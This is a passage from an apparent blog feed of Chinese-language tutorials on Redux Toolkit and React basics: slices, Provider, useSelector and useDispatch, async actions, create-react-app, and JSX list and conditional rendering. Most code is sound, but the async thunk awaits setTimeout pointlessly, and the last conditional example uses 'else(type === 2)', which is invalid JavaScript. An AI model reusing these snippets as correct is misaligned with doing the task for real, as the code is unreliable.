class="string">&#x27;inBtn&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    inBtn.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        store.<span class="title function_">dispatch</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">type</span>: <span class="string">&#x27;INCREMENT&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> deBtn = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;deBtn&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    deBtn.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        store.<span class="title function_">dispatch</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">type</span>: <span class="string">&#x27;DECREMENT&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>Redux数据流架构</strong>：</p><ol><li>state: 一个对象 存放着我们管理的数据</li><li>action: 一个对象 用来描述你想怎么改数据</li><li>reducer: 一个函数 根据action的描述更新state</li></ol><h2 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h2><ol><li>Redux Toolkit（RTK）：官方推荐编写Redux逻辑的方式，是一套工具的集合集，简化书写方式</li><li>react-redux：用来 链接 Redux 和 React组件 的中间件</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i @reduxjs/toolkit  react-redux </span><br></pre></td></tr></table></figure><h1 id="在-React-实现-counter"><a href="#在-React-实现-counter" class="headerlink" title="在 React 实现 counter"></a>在 React 实现 counter</h1><p><strong>使用 React Toolkit 创建 counterStore</strong>：</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240521132255.png" alt="image.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// counter.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; createSlice &#125; <span class="keyword">from</span> <span class="string">&quot;@reduxjs/toolkit&quot;</span>;</span><br><span class="line"><span class="comment">// 创建store</span></span><br><span class="line"><span class="keyword">const</span> counterStore = <span class="title function_">createSlice</span>(&#123;</span><br><span class="line">  <span class="comment">// 模块名</span></span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;counter&#x27;</span>,</span><br><span class="line">  <span class="comment">// 初始化状态数据</span></span><br><span class="line">  <span class="attr">initialState</span>: &#123;</span><br><span class="line">    <span class="attr">count</span>: <span class="number">1</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 修改数据的同步方法，可以直接修改</span></span><br><span class="line">  <span class="attr">reducers</span>:&#123;</span><br><span class="line">    <span class="title function_">increment</span>(<span class="params">state</span>) &#123;</span><br><span class="line">      state.<span class="property">count</span>++</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title function_">decrement</span>(<span class="params">state</span>)&#123;</span><br><span class="line">      state.<span class="property">count</span>--</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 解构出actionCreater</span></span><br><span class="line"><span class="keyword">const</span> &#123; increment, decrement &#125; = counterStore.<span class="property">actions</span></span><br><span class="line"><span class="comment">// 获取reducer函数</span></span><br><span class="line"><span class="keyword">const</span> counterReducer = counterStore.<span class="property">reducer</span></span><br><span class="line"><span class="comment">// 导出</span></span><br><span class="line"><span class="keyword">export</span> &#123; increment, decrement &#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> counterReducer</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; configureStore &#125; <span class="keyword">from</span> <span class="string">&quot;@reduxjs/toolkit&quot;</span>;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> counterReducer <span class="keyword">from</span> <span class="string">&quot;./modules/counter&quot;</span>;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">const</span> store = <span class="title function_">configureStore</span>(&#123;</span><br><span class="line">  <span class="attr">reducer</span>: &#123;</span><br><span class="line">    <span class="comment">// 注册子模块</span></span><br><span class="line">    <span class="attr">counter</span>: counterReducer</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> store</span><br></pre></td></tr></table></figure><p><strong>为 React 注入 store</strong>：</p><p>react-redux 负责把 Redux 和 React 链接 起来，内置 Provider组件 通过 store 参数把创建好的 store 实例注入到应用中，链接正式建立</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.js</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">ReactDOM</span> <span class="keyword">from</span> <span class="string">&#x27;react-dom/client&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">&#x27;./store&#x27;</span> <span class="comment">// 导入store</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Provider</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;react-redux&#x27;</span>; <span class="comment">// 导入store提供的组件Provider</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">const</span> root = <span class="title class_">ReactDOM</span>.<span class="title function_">createRoot</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;root&#x27;</span>));</span><br><span class="line">root.<span class="title function_">render</span>(</span><br><span class="line">  <span class="comment">// 提供store数据</span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">Provider</span> <span class="attr">store</span>=<span class="string">&#123;store&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">App</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">Provider</span>&gt;</span></span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><strong>React 组件使用 store 中的数据</strong>：</p><p>在 React 组件中使用 store 中的数据，需要用到一个钩子函数 <code>useSelector</code>，它的作用是把 store 中的数据映射到组件中</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// App.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; useSelector &#125; <span class="keyword">from</span> <span class="string">&quot;react-redux&quot;</span>; <span class="comment">// 导入useSelector</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span> () &#123;</span><br><span class="line">  <span class="comment">// 解构出state目标</span></span><br><span class="line">  <span class="keyword">const</span> &#123; count &#125; = <span class="title function_">useSelector</span>(<span class="function"><span class="params">state</span> =&gt;</span> state.<span class="property">counter</span>)</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      Hello&#123;count&#125;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">App</span>;</span><br></pre></td></tr></table></figure><p><strong>React 组件中修改 store 数据</strong>：</p><p>React 组件中修改 store 中的数据需要借助另外一个 hook函数<code>useDispatch</code>，它的作用是生成提交 action对象 的 dispatch 函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useSelector, useDispatch &#125; <span class="keyword">from</span> <span class="string">&quot;react-redux&quot;</span>;</span><br><span class="line"><span class="comment">// 导入创建action对象的方法</span></span><br><span class="line"><span class="keyword">import</span> &#123; decrement, increment &#125; <span class="keyword">from</span> <span class="string">&#x27;./store/modules/counter&#x27;</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span> () &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; count &#125; = <span class="title function_">useSelector</span>(<span class="function"><span class="params">state</span> =&gt;</span> state.<span class="property">counter</span>)</span><br><span class="line">  <span class="comment">// 得到dispatch函数</span></span><br><span class="line">  <span class="keyword">const</span> dispatch = <span class="title function_">useDispatch</span>()</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;/* 调用dispatch函数提交action对象 */&#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;()</span> =&gt;</span> dispatch(decrement())&#125;&gt;-<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;count&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;()</span> =&gt;</span> dispatch(increment())&#125;&gt;+<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">App</span>;</span><br></pre></td></tr></table></figure><h1 id="提交-action-传参"><a href="#提交-action-传参" class="headerlink" title="提交 action 传参"></a>提交 action 传参</h1><p>在reducers的同步修改方法中添加action对象参数，在调用actionCreater的时候传递参数，参数会被传递到action对象payload属性上</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createSlice &#125; <span class="keyword">from</span> <span class="string">&quot;@reduxjs/toolkit&quot;</span>;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">const</span> counterStore = <span class="title function_">createSlice</span>(&#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;counter&#x27;</span>,</span><br><span class="line">  <span class="attr">initialState</span>: &#123;</span><br><span class="line">    <span class="attr">count</span>: <span class="number">0</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">reducers</span>:&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="title function_">addCount</span>(<span class="params">state, action</span>) &#123;</span><br><span class="line">      <span class="comment">// console.log(action.payload)</span></span><br><span class="line">      state.<span class="property">count</span> += action.<span class="property">payload</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">const</span> &#123; increment, decrement, addCount &#125; = counterStore.<span class="property">actions</span></span><br><span class="line"><span class="keyword">const</span> counterReducer = counterStore.<span class="property">reducer</span></span><br><span class="line"><span class="keyword">export</span> &#123; increment, decrement, addCount &#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> counterReducer</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;()</span> =&gt;</span> dispatch(addCount(10))&#125;&gt;+10<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="异步-action-处理"><a href="#异步-action-处理" class="headerlink" title="异步 action 处理"></a>异步 action 处理</h1><p><strong>实现步骤</strong></p><ol><li>创建 store 的写法保持不变，配置好同步修改状态的方法</li><li>单独封装一个函数，在函数内部 return 一个新函数，在新函数中  <ol><li>封装异步操作</li><li>调用同步 actionCreater 传入异步数据生成一个 action 对象，并使用 dispatch 提交</li></ol></li><li>组件中 dispatch 的写法保持不变</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createSlice &#125; <span class="keyword">from</span> <span class="string">&quot;@reduxjs/toolkit&quot;</span>;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">const</span> counterStore = <span class="title function_">createSlice</span>(&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="attr">reducers</span>:&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="title function_">addCount</span>(<span class="params">state, action</span>) &#123;</span><br><span class="line">      <span class="comment">// console.log(action.payload)</span></span><br><span class="line">      state.<span class="property">count</span> += action.<span class="property">payload</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">const</span> &#123; increment, decrement, addCount &#125; = counterStore.<span class="property">actions</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置延时函数</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">fetchCounter</span> = (<span class="params">num</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">async</span> (dispatch) =&gt; &#123;</span><br><span class="line">    <span class="keyword">await</span> <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">dispatch</span>(<span class="title function_">addCount</span>(num)) </span><br><span class="line">    &#125;, <span class="number">3000</span>) <span class="comment">// 延时三秒，异步操作</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">const</span> counterReducer = counterStore.<span class="property">reducer</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> &#123; increment, decrement, addCount, fetchCounter &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> counterReducer</span><br></pre></td></tr></table></figure><h1 id="Redux调试-devtools"><a href="#Redux调试-devtools" class="headerlink" title="Redux调试 - devtools"></a>Redux调试 - devtools</h1><p>Redux官方提供了针对于Redux的调试工具，支持实时state信息展示，action提交信息查看等</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240521143421.png" alt="image.png"></p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240521143438.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 前端开发 </category>
          
          <category> React </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> react </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React-基础</title>
      <link href="/2024/05/15/React-%E5%9F%BA%E7%A1%80/"/>
      <url>/2024/05/15/React-%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="开发环境搭建"><a href="#开发环境搭建" class="headerlink" title="开发环境搭建"></a>开发环境搭建</h1><p><strong>create-react-app</strong> 是一个快速创建 React 开发环境的工具，底层由 Webpack 构件，封装了配置细节</p><p>执行命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx create-react-app react-test01</span><br></pre></td></tr></table></figure><ol><li>npx：Node.js 工具命令，查找并执行后续的包命令</li><li>create-react-app：核心包，用于创建 React 项目</li><li>react-test01：React 项目的名称（自定义）</li></ol><p>创建项目的更多方法：<a href="https://zh-hans.react.dev/learn/start-a-new-react-project">https://zh-hans.react.dev/learn/start-a-new-react-project</a></p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240515214934.png" alt="image.png"></p><p>使用命令运行项目：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm start</span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240515215514.png" alt="image.png"></p><p>成功进入项目页面</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240515215152.png" alt="image.png"></p><p>项目目录：</p><ol><li>App.js：项目根组件</li><li>index.js：项目入口</li></ol><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240515222722.png" alt="image.png"></p><h1 id="JSX"><a href="#JSX" class="headerlink" title="JSX"></a>JSX</h1><p>JSX 是 JavaScript 和 XML （HTML）的缩写，表示在 JS 代码中编写 HTML 模块结构，它是 React 中编写 UI 模块的方式</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> message = <span class="string">&#x27;this is message&#x27;</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;App&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            Hello React!</span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">            &#123;message&#125;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">App</span>;</span><br></pre></td></tr></table></figure><p>优势：</p><ol><li>HTML 的声明式模块写法</li><li>JS 的可编程能力</li></ol><p>JSX 并不是标准的 JS 语法，它是 JS 的语法扩展，<strong>浏览器本身不能识别</strong>，需要通过<strong>解析工具做解析</strong>之后才能在浏览器中运行</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/03.png" alt="03.png"></p><h2 id="JSX-表达式"><a href="#JSX-表达式" class="headerlink" title="JSX-表达式"></a>JSX-表达式</h2><ol><li>使用引号传递字符串</li><li>使用JS变量</li><li>函数调用和方法调用</li><li>使用JavaScript对象</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> num = <span class="number">666</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">getNum</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;App&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            Hello React!</span></span><br><span class="line"><span class="language-xml">            &#123;/* 引号传递字符串 */&#125;</span></span><br><span class="line"><span class="language-xml">            &#123;&#x27;this is String&#x27;&#125;</span></span><br><span class="line"><span class="language-xml">            &#123;/* 使用JS变量 */&#125;</span></span><br><span class="line"><span class="language-xml">            &#123;num&#125;</span></span><br><span class="line"><span class="language-xml">            &#123;/* 函数调用和方法调用 */&#125;</span></span><br><span class="line"><span class="language-xml">            &#123;getNum()&#125;</span></span><br><span class="line"><span class="language-xml">            &#123;new Date().getDate()&#125;</span></span><br><span class="line"><span class="language-xml">            &#123;/* 使用JS对象 */&#125;</span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&#123;&#123;color:</span> &#x27;<span class="attr">red</span>&#x27;&#125;&#125;&gt;</span>Hello<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：if语句、switch语句、变量声明不属于表达式，不能出现在<code>&#123;&#125;</code>中  </p><h2 id="JSX-实现列表渲染"><a href="#JSX-实现列表渲染" class="headerlink" title="JSX-实现列表渲染"></a>JSX-实现列表渲染</h2><p>在 JSX 中可以使用原生 JS 中的 map 方法遍历渲染列表</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> list = [</span><br><span class="line">    &#123;<span class="attr">id</span>: <span class="number">1001</span>, <span class="attr">name</span>: <span class="string">&#x27;Vue&#x27;</span>&#125;,</span><br><span class="line">    &#123;<span class="attr">id</span>: <span class="number">1002</span>, <span class="attr">name</span>: <span class="string">&#x27;React&#x27;</span>&#125;,</span><br><span class="line">    &#123;<span class="attr">id</span>: <span class="number">1003</span>, <span class="attr">name</span>: <span class="string">&#x27;Angular&#x27;</span>&#125;</span><br><span class="line">]</span><br><span class="line">  </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;App&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                &#123;list.map(item=&gt;<span class="tag">&lt;<span class="name">li</span> <span class="attr">key</span>=<span class="string">&#123;item.id&#125;</span>&gt;</span>&#123;item.id&#125;&#123;item.name&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span>)&#125;</span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="JSX-实现条件渲染"><a href="#JSX-实现条件渲染" class="headerlink" title="JSX-实现条件渲染"></a>JSX-实现条件渲染</h2><p>在 React 中，可以通过<strong>逻辑与运算符</strong><code>&amp;&amp;</code>、<strong>三元表达式</strong><code>? :</code> 实现基础的条件渲染</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;App&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            &#123;true &amp;&amp; <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&#123;&#123;color:</span> &#x27;<span class="attr">red</span>&#x27;&#125;&#125;&gt;</span>Hello<span class="tag">&lt;/<span class="name">div</span>&gt;</span>&#125;</span></span><br><span class="line"><span class="language-xml">            &#123;false ? new Date().getMonth() : new Date().getDate()&#125;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="JSX-实现复杂条件渲染"><a href="#JSX-实现复杂条件渲染" class="headerlink" title="JSX-实现复杂条件渲染"></a>JSX-实现复杂条件渲染</h2><p>通过 自定义函数 的方式实现复杂条件渲染</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> type = <span class="number">1</span>  <span class="comment">// 0|1|2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getArticleJSX</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(type === <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>无图模式模版<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(type === <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>单图模式模版<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    &#125;<span class="title function_">else</span>(<span class="params">type === <span class="number">2</span></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span 